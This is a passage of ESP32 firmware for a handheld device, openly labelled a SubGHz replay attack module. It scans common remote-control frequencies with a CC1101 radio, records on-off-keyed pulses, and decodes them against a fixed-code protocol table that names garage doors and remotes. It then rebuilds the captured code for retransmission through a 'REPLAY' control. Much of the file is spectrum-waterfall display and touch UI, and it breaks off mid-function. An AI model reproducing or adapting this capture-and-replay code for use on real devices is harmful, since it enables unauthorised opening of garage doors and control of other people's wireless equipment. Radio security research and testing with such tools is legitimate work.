// ═══════════════════════════════════════════════════════════════════════════
// HaleHound-CYD SubGHz Attack Modules Implementation
// CC1101 Signal Capture & Replay with RMT Hardware Timing
// Created: 2026-02-06
// ═══════════════════════════════════════════════════════════════════════════

#include "subghz_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "spi_manager.h"
#include "icon.h"
#include "skull_bg.h"
#include <EEPROM.h>
#include <arduinoFFT.h>

// ═══════════════════════════════════════════════════════════════════════════
// REPLAY ATTACK IMPLEMENTATION
// ═══════════════════════════════════════════════════════════════════════════

namespace ReplayAttack {

// ═══════════════════════════════════════════════════════════════════════════
// RMT PROTOCOL TIMING STRUCTURES
// ═══════════════════════════════════════════════════════════════════════════

struct RCProtocol {
    uint16_t pulseLength;      // Base pulse length in microseconds
    uint8_t syncHigh, syncLow; // Sync pulse ratios
    uint8_t zeroHigh, zeroLow; // Zero bit ratios
    uint8_t oneHigh, oneLow;   // One bit ratios
    bool inverted;             // Invert logic levels
};

// Protocol lookup table - matches RCSwitch library
static const RCProtocol rcProtocols[] = {
    // Proto 0: Invalid/placeholder
    { 0, 0, 0, 0, 0, 0, 0, false },
    // Proto 1: PT2262, EV1527 (most common - garage doors, remotes)
    { 350, 1, 31, 1, 3, 3, 1, false },
    // Proto 2: KlikAanKlikUit
    { 650, 1, 10, 1, 2, 2, 1, false },
    // Proto 3: Tri-state remotes
    { 100, 30, 71, 4, 11, 9, 6, false },
    // Proto 4: Intertechno
    { 380, 1, 6, 1, 3, 3, 1, false },
    // Proto 5: TPI/I-C sockets
    { 500, 6, 14, 1, 2, 2, 1, false },
    // Proto 6: HT6P20B, Conrad RSL (inverted)
    { 450, 23, 1, 1, 2, 2, 1, true },
    // Proto 7: HS2303-PT
    { 150, 2, 62, 1, 6, 6, 1, false },
    // Proto 8:
    { 200, 3, 130, 7, 16, 3, 16, false },
    // Proto 9: (inverted)
    { 200, 130, 7, 16, 7, 16, 3, true },
    // Proto 10: Brennenstuhl (inverted)
    { 365, 18, 1, 3, 1, 1, 3, true },
    // Proto 11: (inverted)
    { 270, 36, 1, 1, 2, 2, 1, true },
    // Proto 12: (inverted)
    { 320, 36, 1, 1, 2, 2, 1, true },
};
static const int NUM_RC_PROTOCOLS = sizeof(rcProtocols) / sizeof(rcProtocols[0]);

// RMT symbol buffer for TX
#define RMT_MAX_SYMBOLS 128
static rmt_item32_t rmtSymbols[RMT_MAX_SYMBOLS];
static bool rmtInitialized = false;

// RMT RX for signal capture (GPIO35 doesn't work with attachInterrupt)
#define RMT_RX_CHANNEL    RMT_CHANNEL_1
#define RMT_RX_BUF_SIZE   2048
#define RMT_CLK_DIV       80    // 80MHz/80 = 1MHz (1 tick = 1us)
static RingbufHandle_t rmtRxRingBuf = NULL;
static bool rmtRxInitialized = false;

#ifdef NMRF_HAT
// Hat: GDO0 and GDO2 share GPIO 22 — RMT TX and RX can't run simultaneously
static void pauseRmtRx() {
    if (rmtRxInitialized) {
        rmt_rx_stop(RMT_RX_CHANNEL);
        rmt_driver_uninstall(RMT_RX_CHANNEL);
        rmtRxInitialized = false;
        rmtRxRingBuf = NULL;
    }
}

static void resumeRmtRx() {
    if (rmtRxInitialized) return;
    rmt_config_t rxConfig = RMT_DEFAULT_CONFIG_RX((gpio_num_t)CC1101_GDO2, RMT_RX_CHANNEL);
    rxConfig.clk_div = RMT_CLK_DIV;
    rxConfig.rx_config.filter_en = true;
    rxConfig.rx_config.filter_ticks_thresh = 100;
    rxConfig.rx_config.idle_threshold = 12000;
    if (rmt_config(&rxConfig) == ESP_OK) {
        if (rmt_driver_install(RMT_RX_CHANNEL, RMT_RX_BUF_SIZE, 0) == ESP_OK) {
            rmt_get_ringbuf_handle(RMT_RX_CHANNEL, &rmtRxRingBuf);
            rmt_rx_start(RMT_RX_CHANNEL, true);
            rmtRxInitialized = true;
        }
    }
}
#endif

// ═══════════════════════════════════════════════════════════════════════════
// FREQUENCY LIST
// ═══════════════════════════════════════════════════════════════════════════

static const uint32_t frequencyList[] = {
    300000000, 303875000, 304250000, 310000000, 315000000, 318000000,
    390000000, 418000000, 433075000, 433420000, 433920000, 434420000,
    434775000, 438900000, 868350000, 915000000, 925000000
};
static const int frequencyCount = sizeof(frequencyList) / sizeof(frequencyList[0]);

// ═══════════════════════════════════════════════════════════════════════════
// STATE VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

static bool initialized = false;
static bool exitRequested = false;
static int currentFreqIndex = 10;  // Default to 433.920 MHz

// Captured signal
static RCSwitch rcSwitch;
static bool signalCaptured = false;
static unsigned long capturedValue = 0;
static int capturedBitLength = 0;
static int capturedProtocol = 0;

// Auto-scan
static bool autoScanEnabled = false;
static int autoScanIndex = 0;
static unsigned long autoScanLastChange = 0;
static bool autoScanPaused = false;
static unsigned long autoScanPauseTime = 0;
#define AUTO_SCAN_DWELL_MS 100
#define AUTO_SCAN_RSSI_THRESHOLD -60
#define AUTO_SCAN_PAUSE_MS 2000

// Profiles
#define EEPROM_SIZE 512
#define EEPROM_PROFILE_START 100
#define EEPROM_PROFILE_COUNT_ADDR 0
static int profileCount = 0;

// ═══════════════════════════════════════════════════════════════════════════
// FFT WATERFALL VARIABLES
// ═══════════════════════════════════════════════════════════════════════════

#define FFT_SAMPLES_SUB 256
#define FFT_FREQUENCY_SUB 5000
static const unsigned long sampling_period_sub = round(1000000.0 / FFT_FREQUENCY_SUB);

static double vRealSUB[FFT_SAMPLES_SUB];
static double vImagSUB[FFT_SAMPLES_SUB];
static ArduinoFFT<double> FFTSUB = ArduinoFFT<double>();

static byte palette_red[128], palette_green[128], palette_blue[128];
static double attenuation_sub = 10;
static unsigned int epoch_sub = 0;
static bool paletteInitialized = false;

// Initialize color palette - HALEHOUND CYBERPUNK (matches packet monitor)
static void initPalette() {
    if (paletteInitialized) return;

    // Stage 1 (0-31): Black → Deep Purple (emerging from darkness)
    for (int i = 0; i < 32; i++) {
        palette_red[i] = (i * 15) / 31;
        palette_green[i] = 0;
        palette_blue[i] = (i * 20) / 31;
    }
    // Stage 2 (32-63): Deep Purple → Electric Blue (the glow begins)
    for (int i = 32; i < 64; i++) {
        int t = i - 32;
        palette_red[i] = 15 - (t * 15) / 31;
        palette_green[i] = (t * 31) / 31;
        palette_blue[i] = 20 + (t * 11) / 31;
    }
    // Stage 3 (64-95): Electric Blue → Hot Pink (MAXIMUM POP)
    for (int i = 64; i < 96; i++) {
        int t = i - 64;
        palette_red[i] = (t * 31) / 31;
        palette_green[i] = 31 - (t * 31) / 31;
        palette_blue[i] = 31;
    }
    // Stage 4 (96-127): Hot Pink → White (blowout at peak)
    for (int i = 96; i < 128; i++) {
        int t = i - 96;
        palette_red[i] = 31;
        palette_green[i] = (t * 63) / 31;
        palette_blue[i] = 31;
    }

    paletteInitialized = true;
}

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE FFT ENGINE
// Core 0: RSSI sampling + FFT compute (CPU-intensive, ~51ms per frame)
// Core 1: Waterfall drawing + touch/buttons + auto-scan
// CC1101 SPI access protected by mutex (both cores need it)
// ═══════════════════════════════════════════════════════════════════════════

static SemaphoreHandle_t cc1101Mtx = NULL;
static TaskHandle_t fftTaskHandle = NULL;
static volatile bool fftTaskRunning = false;

// Shared FFT result buffer — Core 0 writes, Core 1 reads
#define FFT_LINE_WIDTH 120  // half of 240px screen width
static volatile int fftKValues[FFT_LINE_WIDTH];
static volatile int fftMaxK = 0;
static volatile bool fftFrameReady = false;

static inline bool cc1101Lock(TickType_t timeout = pdMS_TO_TICKS(100)) {
    return cc1101Mtx && xSemaphoreTake(cc1101Mtx, timeout) == pdTRUE;
}
static inline void cc1101Unlock() {
    if (cc1101Mtx) xSemaphoreGive(cc1101Mtx);
}

// Core 0 FFT task — samples RSSI + computes FFT, stores results for Core 1 to draw
static void fftTask(void* param) {
    fftTaskRunning = true;

    while (!exitRequested && initialized) {
        // Wait for previous frame to be drawn before overwriting
        if (fftFrameReady) {
            vTaskDelay(pdMS_TO_TICKS(5));
            continue;
        }

        #define ALPHA_TASK 0.2f
        float ewmaRSSI = -50;

        // Acquire CC1101 mutex for RSSI sampling (~51ms)
        if (!cc1101Lock(pdMS_TO_TICKS(200))) {
            vTaskDelay(pdMS_TO_TICKS(10));
            continue;
        }

        unsigned long microseconds = micros();
        for (int i = 0; i < FFT_SAMPLES_SUB; i++) {
            int rssi = ELECHOUSE_cc1101.getRssi();
            rssi += 100;
            ewmaRSSI = (ALPHA_TASK * rssi) + ((1 - ALPHA_TASK) * ewmaRSSI);
            vRealSUB[i] = ewmaRSSI * 2;
            vImagSUB[i] = 1;
            while (micros() - microseconds < sampling_period_sub) { }
            microseconds += sampling_period_sub;
        }

        cc1101Unlock();  // Release CC1101 — FFT compute doesn't need SPI

        // DC offset removal
        double mean = 0;
        for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) mean += vRealSUB[i];
        mean /= FFT_SAMPLES_SUB;
        for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) vRealSUB[i] -= mean;

        // FFT compute
        FFTSUB.windowing(vRealSUB, FFT_SAMPLES_SUB, FFTWindow::Hamming, FFTDirection::Forward);
        FFTSUB.compute(vRealSUB, vImagSUB, FFT_SAMPLES_SUB, FFTDirection::Forward);
        FFTSUB.complexToMagnitude(vRealSUB, vImagSUB, FFT_SAMPLES_SUB);

        // Compute k-values for each pixel position
        const unsigned int half_width = FFT_LINE_WIDTH;
        float scale = (float)half_width / (float)(FFT_SAMPLES_SUB >> 1);
        int maxK = 0;

        for (int j = 0; j < (int)half_width; j++) {
            int fft_idx = (int)(j / scale);
            if (fft_idx >= (FFT_SAMPLES_SUB >> 1)) fft_idx = (FFT_SAMPLES_SUB >> 1) - 1;
            int k = vRealSUB[fft_idx] / attenuation_sub;
            if (k > maxK) maxK = k;
            if (k > 127) k = 127;
            if (k < 0) k = 0;
            fftKValues[j] = k;
        }

        fftMaxK = maxK;
        fftFrameReady = true;

        vTaskDelay(1);
    }

    fftTaskRunning = false;
    vTaskDelete(NULL);
}

static void startFFTTask() {
    if (fftTaskHandle != NULL) return;
    if (cc1101Mtx == NULL) cc1101Mtx = xSemaphoreCreateMutex();
    xTaskCreatePinnedToCore(fftTask, "fftSample", 8192, NULL, 1, &fftTaskHandle, 0);
}

static void stopFFTTask() {
    // exitRequested already set by caller — task checks it
    if (fftTaskHandle == NULL) return;

    unsigned long start = millis();
    while (fftTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    if (fftTaskRunning) {
        vTaskDelete(fftTaskHandle);
    }

    fftTaskHandle = NULL;
    fftTaskRunning = false;
}

// Core 1: Draw one waterfall line from shared FFT buffer
static void drawWaterfallLine() {
    if (!fftFrameReady) return;

    const unsigned int center_x = SCREEN_WIDTH / 2;
    const unsigned int half_width = FFT_LINE_WIDTH;
    const unsigned int waterfall_y = 55;
    const unsigned int waterfall_height = SCREEN_HEIGHT - waterfall_y - 5;

    // Right side waterfall
    for (int j = 0; j < (int)half_width; j++) {
        int k = fftKValues[j];
        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x + j, epoch_sub + waterfall_y, color);
    }

    // Left side waterfall (mirrored)
    for (int j = 0; j < (int)half_width; j++) {
        int k = fftKValues[j];
        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x - j - 1, epoch_sub + waterfall_y, color);
    }

    // Auto-scale attenuation
    double tattenuation = fftMaxK / 127.0;
    if (tattenuation > attenuation_sub) {
        attenuation_sub = tattenuation;
    }

    // Advance waterfall row
    epoch_sub++;
    if (epoch_sub >= waterfall_height) {
        epoch_sub = 0;
    }

    fftFrameReady = false;
}

// Legacy single-threaded FFT (kept for reference, replaced by fftTask + drawWaterfallLine)
static void doSamplingFFT() {
    unsigned long microseconds = micros();

    #define ALPHA_SUB 0.2
    float ewmaRSSI = -50;

    // Sample RSSI from CC1101
    for (int i = 0; i < FFT_SAMPLES_SUB; i++) {
        int rssi = ELECHOUSE_cc1101.getRssi();
        rssi += 100;  // Shift to positive range

        ewmaRSSI = (ALPHA_SUB * rssi) + ((1 - ALPHA_SUB) * ewmaRSSI);

        vRealSUB[i] = ewmaRSSI * 2;
        vImagSUB[i] = 1;

        while (micros() - microseconds < sampling_period_sub) {
            // Busy wait for precise timing
        }
        microseconds += sampling_period_sub;
    }

    // Remove DC offset
    double mean = 0;
    for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) {
        mean += vRealSUB[i];
    }
    mean /= FFT_SAMPLES_SUB;
    for (uint16_t i = 0; i < FFT_SAMPLES_SUB; i++) {
        vRealSUB[i] -= mean;
    }

    // Perform FFT (old-style API matching original ESP32-DIV)
    FFTSUB.windowing(vRealSUB, FFT_SAMPLES_SUB, FFTWindow::Hamming, FFTDirection::Forward);
    FFTSUB.compute(vRealSUB, vImagSUB, FFT_SAMPLES_SUB, FFTDirection::Forward);
    FFTSUB.complexToMagnitude(vRealSUB, vImagSUB, FFT_SAMPLES_SUB);

    // ═══════════════════════════════════════════════════════════════════════
    // WATERFALL DISPLAY - Centered, mirrored from middle of screen
    // ═══════════════════════════════════════════════════════════════════════

    const unsigned int center_x = SCREEN_WIDTH / 2;
    const unsigned int half_width = min((int)(FFT_SAMPLES_SUB >> 1), (int)center_x);
    const unsigned int waterfall_y = 55;
    const unsigned int waterfall_height = SCREEN_HEIGHT - waterfall_y - 5;

    int max_k = 0;
    float scale = (float)half_width / (float)(FFT_SAMPLES_SUB >> 1);

    // Right side waterfall
    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES_SUB >> 1)) fft_idx = (FFT_SAMPLES_SUB >> 1) - 1;

        int k = vRealSUB[fft_idx] / attenuation_sub;
        if (k > max_k) max_k = k;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x + j, epoch_sub + waterfall_y, color);
    }

    // Left side waterfall (mirrored)
    for (int j = 0; j < half_width; j++) {
        int fft_idx = (int)(j / scale);
        if (fft_idx >= (FFT_SAMPLES_SUB >> 1)) fft_idx = (FFT_SAMPLES_SUB >> 1) - 1;

        int k = vRealSUB[fft_idx] / attenuation_sub;
        if (k > 127) k = 127;
        if (k < 0) k = 0;

        unsigned int color = palette_red[k] << 11 | palette_green[k] << 5 | palette_blue[k];
        tft.drawPixel(center_x - j - 1, epoch_sub + waterfall_y, color);
    }

    // Auto-scale attenuation
    double tattenuation = max_k / 127.0;
    if (tattenuation > attenuation_sub) {
        attenuation_sub = tattenuation;
    }

    // Advance waterfall row
    epoch_sub++;
    if (epoch_sub >= waterfall_height) {
        epoch_sub = 0;
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// DISPLAY FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void updateDisplay() {
    // Status bar below icon bar (Y=38-52)
    tft.fillRect(0, 38, SCREEN_WIDTH, 14, HALEHOUND_BLACK);
    tft.setTextSize(1);

    // Frequency
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 40);
    if (autoScanEnabled) {
        tft.setTextColor(autoScanPaused ? HALEHOUND_HOTPINK : HALEHOUND_BRIGHT);
        tft.print(frequencyList[autoScanIndex] / 1000000.0, 3);
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.print(" SCAN");
    } else {
        tft.setTextColor(HALEHOUND_BRIGHT);
        tft.print(frequencyList[currentFreqIndex] / 1000000.0, 3);
        tft.setTextColor(HALEHOUND_MAGENTA);
        tft.print(" MHz");
    }

    // Signal info (if captured)
    if (signalCaptured) {
        tft.setCursor(120, 40);
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.print("P");
        tft.print(capturedProtocol);
        tft.print(" ");
        tft.print(capturedBitLength);
        tft.print("b");
    }

    // RSSI + CC1101 tune (mutex protects from Core 0 FFT sampling)
    int rssi = -99;
    if (cc1101Lock(pdMS_TO_TICKS(60))) {
        rssi = ELECHOUSE_cc1101.getRssi();

        // Tune CC1101
        ELECHOUSE_cc1101.setSidle();
        if (autoScanEnabled) {
            ELECHOUSE_cc1101.setMHZ(frequencyList[autoScanIndex] / 1000000.0);
        } else {
            ELECHOUSE_cc1101.setMHZ(frequencyList[currentFreqIndex] / 1000000.0);
        }
        ELECHOUSE_cc1101.SetRx();
        cc1101Unlock();
    }

    tft.setCursor(190, 40);
    tft.setTextColor(rssi > -60 ? HALEHOUND_HOTPINK : HALEHOUND_VIOLET);
    tft.print(rssi);
}

// Icon bar configuration - MATCHES ORIGINAL (5 icons)
#define RA_ICON_SIZE 16
#define RA_ICON_NUM 5
static int raIconX[RA_ICON_NUM] = {90, 130, 170, 210, 10};
static const unsigned char* raIcons[RA_ICON_NUM] = {
    bitmap_icon_sort_up_plus,      // 0: Next freq
    bitmap_icon_sort_down_minus,   // 1: Prev freq
    bitmap_icon_flash,             // 2: REPLAY (transmit captured signal)
    bitmap_icon_floppy,            // 3: Save/Profiles
    bitmap_icon_go_back            // 4: Back
};

// Draw icon bar - MATCHES ORIGINAL HALEHOUND
static void drawReplayUI() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    for (int i = 0; i < RA_ICON_NUM; i++) {
        tft.drawBitmap(raIconX[i], 20, raIcons[i], RA_ICON_SIZE, RA_ICON_SIZE, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void drawUI() {
    // Separator below status bar
    tft.drawLine(0, 53, SCREEN_WIDTH, 53, HALEHOUND_HOTPINK);

    // Skull splatter watermark - full screen
    tft.drawBitmap(0, 0, skull_bg_bitmap, SKULL_BG_WIDTH, SKULL_BG_HEIGHT, 0x0041);  // Dark cyan watermark
}

static void drawSignalCaptured() {
    // Flash effect
    tft.fillRect(20, 100, 200, 90, HALEHOUND_HOTPINK);
    delay(50);
    tft.fillRect(20, 100, 200, 90, HALEHOUND_DARK);

    // Draw capture panel with border
    tft.drawRect(20, 100, 200, 90, HALEHOUND_HOTPINK);
    tft.drawRect(21, 101, 198, 88, HALEHOUND_MAGENTA);

    // Header
    tft.setTextSize(1);
    tft.setTextColor(HALEHOUND_HOTPINK);
    tft.setCursor(55, 108);
    tft.print(">> CAPTURED <<");

    // Value (larger, centered)
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.setCursor(30, 125);
    tft.print(capturedValue);

    // Details row
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(30, 145);
    tft.print("P:");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(capturedProtocol);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(" B:");
    tft.setTextColor(HALEHOUND_BRIGHT);
    tft.print(capturedBitLength);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.print(" ");
    tft.setTextColor(HALEHOUND_BRIGHT);
    if (autoScanEnabled) {
        tft.print(frequencyList[autoScanIndex] / 1000000.0, 2);
    } else {
        tft.print(frequencyList[currentFreqIndex] / 1000000.0, 2);
    }

    // Action hint
    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(50, 175);
    tft.print("TAP CENTER: REPLAY");
}

// ═══════════════════════════════════════════════════════════════════════════
// RMT DRIVER
// ═══════════════════════════════════════════════════════════════════════════

bool initRMT() {
    if (rmtInitialized) return true;

    rmt_config_t config = RMT_DEFAULT_CONFIG_TX((gpio_num_t)CC1101_GDO0, RMT_CHANNEL_0);
    config.clk_div = 80;  // 1μs resolution (80MHz / 80 = 1MHz)
    config.tx_config.idle_level = RMT_IDLE_LEVEL_LOW;
    config.tx_config.idle_output_en = true;

    esp_err_t err = rmt_config(&config);
    if (err != ESP_OK) {
        #if CYD_DEBUG
        Serial.println("[RMT] Config failed: " + String(err));
        #endif
        return false;
    }

    err = rmt_driver_install(RMT_CHANNEL_0, 0, 0);
    if (err != ESP_OK) {
        #if CYD_DEBUG
        Serial.println("[RMT] Driver install failed: " + String(err));
        #endif
        return false;
    }

    rmtInitialized = true;
    #if CYD_DEBUG
    Serial.println("[RMT] Initialized on GPIO " + String(CC1101_GDO0));
    #endif
    return true;
}

bool isRMTInitialized() {
    return rmtInitialized;
}

void rmtTransmit(rmt_item32_t* items, size_t numItems) {
    if (!rmtInitialized) return;
    rmt_write_items(RMT_CHANNEL_0, items, numItems, true);
    rmt_wait_tx_done(RMT_CHANNEL_0, portMAX_DELAY);
}

static int buildRMTSymbols(int protocol, unsigned long value, int bitLength) {
    if (protocol < 1 || protocol >= NUM_RC_PROTOCOLS) {
        return 0;
    }

    const RCProtocol& proto = rcProtocols[protocol];
    uint8_t highLevel = proto.inverted ? 0 : 1;
    uint8_t lowLevel = proto.inverted ? 1 : 0;

    int idx = 0;

    // Data bits (MSB first)
    for (int i = bitLength - 1; i >= 0 && idx < RMT_MAX_SYMBOLS - 1; i--) {
        if ((value >> i) & 1) {
            // One bit
            rmtSymbols[idx].level0 = highLevel;
            rmtSymbols[idx].duration0 = proto.pulseLength * proto.oneHigh;
            rmtSymbols[idx].level1 = lowLevel;
            rmtSymbols[idx].duration1 = proto.pulseLength * proto.oneLow;
        } else {
            // Zero bit
            rmtSymbols[idx].level0 = highLevel;
            rmtSymbols[idx].duration0 = proto.pulseLength * proto.zeroHigh;
            rmtSymbols[idx].level1 = lowLevel;
            rmtSymbols[idx].duration1 = proto.pulseLength * proto.zeroLow;
        }
        idx++;
    }

    // Sync pulse after data
    rmtSymbols[idx].level0 = highLevel;
    rmtSymbols[idx].duration0 = proto.pulseLength * proto.syncHigh;
    rmtSymbols[idx].level1 = lowLevel;
    rmtSymbols[idx].duration1 = proto.pulseLength * proto.syncLow;
    idx++;

    return idx;
}

// ═══════════════════════════════════════════════════════════════════════════
// RMT RX SIGNAL DECODING (replaces RCSwitch interrupt-based detection)
// ═══════════════════════════════════════════════════════════════════════════

// Check if pulse duration is within tolerance of target
static bool pulseMatch(uint32_t duration, uint32_t target, uint8_t tolerance = 60) {
    uint32_t tol = (target * tolerance) / 100;
    return (duration >= (target - tol) && duration <= (target + tol));
}

// Decode RMT items into signal value, returns true if valid signal found
static bool decodeRmtSignal(rmt_item32_t* items, size_t itemCount,
                            unsigned long* outValue, int* outBitLength, int* outProtocol) {
    if (itemCount < 8) return false;  // Need at least sync + some bits

    // Try each protocol
    for (int proto = 1; proto < NUM_RC_PROTOCOLS; proto++) {
        const RCProtocol& p = rcProtocols[proto];
        if (p.pulseLength == 0) continue;

        // Look for sync pulse in the data
        for (size_t i = 0; i < itemCount - 1; i++) {
            uint32_t high = items[i].duration0;
            uint32_t low = items[i].duration1;

            // Check for sync: short high, long low (or inverted)
            uint32_t expectedSyncHigh = p.pulseLength * p.syncHigh;
            uint32_t expectedSyncLow = p.pulseLength * p.syncLow;

            bool syncFound = false;
            if (!p.inverted) {
                syncFound = pulseMatch(high, expectedSyncHigh, 70) &&
                           pulseMatch(low, expectedSyncLow, 70);
            } else {
                syncFound = pulseMatch(low, expectedSyncHigh, 70) &&
                           pulseMatch(high, expectedSyncLow, 70);
            }

            if (!syncFound) continue;

            // Found potential sync, try to decode bits
            unsigned long value = 0;
            int bitCount = 0;
            bool valid = true;

            // Decode subsequent items as data bits
            for (size_t j = i + 1; j < itemCount && bitCount < 32; j++) {
                uint32_t h = items[j].duration0;
                uint32_t l = items[j].duration1;

                // Skip if this looks like another sync (end of packet)
                if (l > p.pulseLength * 10) break;

                uint32_t expectedZeroHigh = p.pulseLength * p.zeroHigh;
                uint32_t expectedZeroLow = p.pulseLength * p.zeroLow;
                uint32_t expectedOneHigh = p.pulseLength * p.oneHigh;
                uint32_t expectedOneLow = p.pulseLength * p.oneLow;

                bool isZero, isOne;
                if (!p.inverted) {
                    isZero = pulseMatch(h, expectedZeroHigh) && pulseMatch(l, expectedZeroLow);
                    isOne = pulseMatch(h, expectedOneHigh) && pulseMatch(l, expectedOneLow);
                } else {
                    isZero = pulseMatch(l, expectedZeroHigh) && pulseMatch(h, expectedZeroLow);
                    isOne = pulseMatch(l, expectedOneHigh) && pulseMatch(h, expectedOneLow);
                }

                if (isZero) {
                    value = (value << 1) | 0;
                    bitCount++;
                } else if (isOne) {
                    value = (value << 1) | 1;
                    bitCount++;
                } else {
                    // Unknown bit pattern, stop
                    break;
                }
            }

            // Valid if we got enough bits
            if (bitCount >= 8 && value != 0) {
                *outValue = value;
                *outBitLength = bitCount;
                *outProtocol = proto;
                return true;
            }
        }
    }

    return false;
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[SUBGHZ] Initializing Replay Attack...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawReplayUI();  // Icon bar instead of title bar

    // Deselect other SPI devices so they don't interfere
    pinMode(NRF24_CSN, OUTPUT);
    digitalWrite(NRF24_CSN, HIGH);  // Deselect NRF24 (GPIO4)
    pinMode(SD_CS, OUTPUT);
    digitalWrite(SD_CS, HIGH);       // Deselect SD (GPIO5)

    // Reset SPI bus so ELECHOUSE can configure fresh (same pattern as working NRF24)
    SPI.end();
    delay(5);

    // Configure CC1101 SPI and GDO pins
    ELECHOUSE_cc1101.setSpiPin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, CC1101_CS);
    ELECHOUSE_cc1101.setGDO(CC1101_GDO0, CC1101_GDO2);

    // Initialize CC1101
    if (ELECHOUSE_cc1101.getCC1101()) {
        ELECHOUSE_cc1101.Init();
        ELECHOUSE_cc1101.setCCMode(0);       // Raw/RCSwitch mode - enables serial data on GDO2
        ELECHOUSE_cc1101.setModulation(2);   // ASK/OOK modulation
        ELECHOUSE_cc1101.setMHZ(frequencyList[currentFreqIndex] / 1000000.0);
        ELECHOUSE_cc1101.SetRx();

        #if CYD_DEBUG
        Serial.println("[SUBGHZ] CC1101 initialized on SPI18/19/23 CS27 GDO0=22 GDO2=35");
        #endif
    } else {
        #if CYD_DEBUG
        Serial.println("[SUBGHZ] CC1101 not found! Check wiring.");
        #endif
        tft.setTextColor(TFT_RED);
        tft.setCursor(10, 100);
        tft.print("ERROR: CC1101 not found!");
        tft.setCursor(10, 115);
        tft.print("Check SPI wiring!");
        delay(2000);
    }

    // Initialize RMT RX for signal capture (GPIO35 doesn't work with attachInterrupt)
    // Using RMT hardware peripheral instead - captures pulses via DMA, no interrupts needed
    {
        rmt_config_t rxConfig = RMT_DEFAULT_CONFIG_RX((gpio_num_t)CC1101_GDO2, RMT_RX_CHANNEL);
        rxConfig.clk_div = RMT_CLK_DIV;  // 1 tick = 1 microsecond
        rxConfig.rx_config.filter_en = true;
        rxConfig.rx_config.filter_ticks_thresh = 100;  // Ignore pulses < 100us (noise)
        rxConfig.rx_config.idle_threshold = 12000;     // End packet after 12ms idle

        esp_err_t err = rmt_config(&rxConfig);
        if (err == ESP_OK) {
            err = rmt_driver_install(RMT_RX_CHANNEL, RMT_RX_BUF_SIZE, 0);
        }
        if (err == ESP_OK) {
            rmt_get_ringbuf_handle(RMT_RX_CHANNEL, &rmtRxRingBuf);
            rmt_rx_start(RMT_RX_CHANNEL, true);
            rmtRxInitialized = true;
            #if CYD_DEBUG
            Serial.println("[SUBGHZ] RMT RX initialized on GPIO35");
            #endif
        } else {
            #if CYD_DEBUG
            Serial.printf("[SUBGHZ] RMT RX init failed: %d\n", err);
            #endif
        }
    }

    // Load profile count from EEPROM
    EEPROM.begin(EEPROM_SIZE);
    profileCount = EEPROM.read(EEPROM_PROFILE_COUNT_ADDR);
    if (profileCount > MAX_PROFILES || profileCount < 0) {
        profileCount = 0;
    }
    EEPROM.end();

    // Reset state
    signalCaptured = false;
    capturedValue = 0;
    capturedBitLength = 0;
    capturedProtocol = 0;
    autoScanEnabled = false;
    exitRequested = false;

    // Initialize FFT waterfall
    initPalette();
    epoch_sub = 0;
    attenuation_sub = 10;
    fftFrameReady = false;
    fftTaskHandle = NULL;
    fftTaskRunning = false;

    drawUI();
    updateDisplay();

    initialized = true;

    // Launch Core 0 FFT sampling task
    startFFTTask();

    #if CYD_DEBUG
    Serial.printf("[SUBGHZ] Ready on %.3f MHz (FFT on Core 0)\n", frequencyList[currentFreqIndex] / 1000000.0);
    #endif
}

void loop() {
    if (!initialized) return;

    // Heartbeat debug
    static unsigned long lastHB = 0;
    if (millis() - lastHB > 2000) {
        Serial.printf("[HB] ReplayAttack rmtInit=%d ringBuf=%p\n", rmtRxInitialized, rmtRxRingBuf);
        lastHB = millis();
    }

    // Update touch buttons
    touchButtonsUpdate();

    // Icon bar touch handling
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= 20 && ty <= 36) {
                for (int i = 0; i < RA_ICON_NUM; i++) {
                    if (tx >= raIconX[i] && tx < raIconX[i] + RA_ICON_SIZE) {
                        lastIconTap = millis();
                        switch (i) {
                            case 0: // Next freq
                                if (!autoScanEnabled) { nextFrequency(); updateDisplay(); }
                                break;
                            case 1: // Prev freq
                                if (!autoScanEnabled) { prevFrequency(); updateDisplay(); }
                                break;
                            case 2: // REPLAY signal
                                if (signalCaptured) {
                                    sendSignal();
                                } else {
                                    // Flash "NO SIGNAL" feedback
                                    tft.fillRect(60, 140, 120, 20, HALEHOUND_HOTPINK);
                                    tft.setTextColor(HALEHOUND_BLACK);
                                    tft.setCursor(70, 144);
